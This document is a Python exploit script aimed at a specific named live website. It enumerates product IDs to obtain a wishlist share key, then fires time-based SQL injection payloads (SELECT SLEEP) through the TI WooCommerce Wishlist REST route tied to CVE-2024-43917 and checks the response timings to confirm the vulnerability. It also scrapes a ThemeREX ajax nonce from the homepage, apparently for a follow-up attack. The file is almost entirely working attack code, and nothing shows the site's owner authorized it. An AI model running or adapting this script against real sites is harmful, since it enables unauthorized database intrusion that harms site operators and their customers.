#!/usr/bin/env python3
"""kznvip Critical POST egress probe — ThemeREX + TI Wishlist SQLi (CVE-2024-43917)."""
import json, time, uuid, re, urllib.request, urllib.parse
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
results = {"ts": time.time(), "tests": []}

def http(method, url, data=None, headers=None, timeout=90):
    h = {"User-Agent": "Mozilla/5.0 lurksek-gha", "Accept": "*/*"}
    if headers: h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read()
            return r.status, time.time()-t0, body, dict(r.headers)
    except Exception as e:
        return 0, time.time()-t0, str(e).encode(), {}

# --- create wishlist / extract share key ---
boundary = "----GHA" + uuid.uuid4().hex[:12]
share = None
for pid in list(range(1, 80)) + [6130, 9000, 9139]:
    parts = []
    for k, v in [("tinv_wishlist_id", ""), ("product_id", str(pid)), ("product_action", "addto")]:
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode())
    parts.append(f"--{boundary}--\r\n".encode())
    body = b"".join(parts)
    code, t, resp, _ = http("POST", TARGET + "/", data=body, headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    }, timeout=40)
    text = resp.decode("utf-8", "replace")
    m = re.search(r"kznvip\.co\.za\\?/([a-f0-9]{6})", text)
    if m:
        share = m.group(1)
        results["share_key"] = share
        results["share_from_pid"] = pid
        results["share_resp"] = text[:500]
        print("SHARE", share, "pid", pid)
        break
    if "share_key" in text:
        m2 = re.search(r'"share_key"\s*:\s*"([A-Za-z0-9]+)"', text)
        if m2:
            share = m2.group(1)
            results["share_key"] = share
            print("SHARE", share)
            break

if not share:
    results["error"] = "no share key"
    (OUT / "results.json").write_text(json.dumps(results, indent=2))
    raise SystemExit(1)

# --- rigorous SQLi timing on same runner ---
def rest_order(order):
    q = urllib.parse.urlencode({"count": 10, "offset": 0, "order": order})
    url = f"{TARGET}/wp-json/wc/v3/wishlist/{share}/get_products?{q}"
    return http("GET", url, timeout=120)

def msf_order(order):
    q = urllib.parse.urlencode({"_method": "GET", "order": order, "count": 10, "offset": 0})
    url = f"{TARGET}/?{q}"
    data = f"rest_route=/wc/v3/wishlist/{share}/get_products".encode()
    return http("POST", url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=120)

suite = []
for label, order, fn in [
    ("ASC1", "ASC", rest_order),
    ("ASC2", "ASC", rest_order),
    ("ASC3", "ASC", rest_order),
    ("S5a", ",(SELECT SLEEP(5))--", rest_order),
    ("S5b", ",(SELECT SLEEP(5))--", rest_order),
    ("S10a", ",(SELECT SLEEP(10))--", rest_order),
    ("S10b", ",(SELECT SLEEP(10))--", rest_order),
    ("ASC4", "ASC", rest_order),
    ("M_ASC", "ASC", msf_order),
    ("M_S5", ",(SELECT SLEEP(5))--", msf_order),
    ("M_S10", ",(SELECT SLEEP(10))--", msf_order),
]:
    code, t, body, _ = fn(order)
    entry = {"label": label, "order": order, "code": code, "time": round(t, 3), "body": body[:120].decode("utf-8", "replace")}
    suite.append(entry)
    print(f"{label:6s} code={code} t={t:6.2f} {body[:40]!r}")

results["suite"] = suite
asc = [x["time"] for x in suite if x["label"].startswith("ASC") and x["code"] == 200]
s5 = [x["time"] for x in suite if x["label"].startswith("S5") and x["code"] == 200]
s10 = [x["time"] for x in suite if x["label"].startswith("S10") and x["code"] == 200]
import statistics
confirmed = False
reason = ""
if asc and s5 and s10:
    a, b, c = statistics.median(asc), statistics.median(s5), statistics.median(s10)
    if b >= a + 3.5 and c >= a + 8:
        confirmed = True
        reason = f"median ASC={a:.2f} S5={b:.2f} S10={c:.2f}"
results["confirmed"] = confirmed
results["reason"] = reason
(OUT / "results.json").write_text(json.dumps(results, indent=2))
print("CONFIRMED" if confirmed else "NOT_CONFIRMED", reason)
# also ThemeREX quick check
nonce_html_code, _, home, _ = http("GET", TARGET + "/", timeout=40)
m = re.search(r'ajax_nonce\":\"([a-f0-9]+)\"', home.decode("utf-8", "replace"))
nonce = m.group(1) if m else ""
results["trx_nonce"] = nonce
(OUT / "results.json").write_text(json.dumps(results, indent=2))
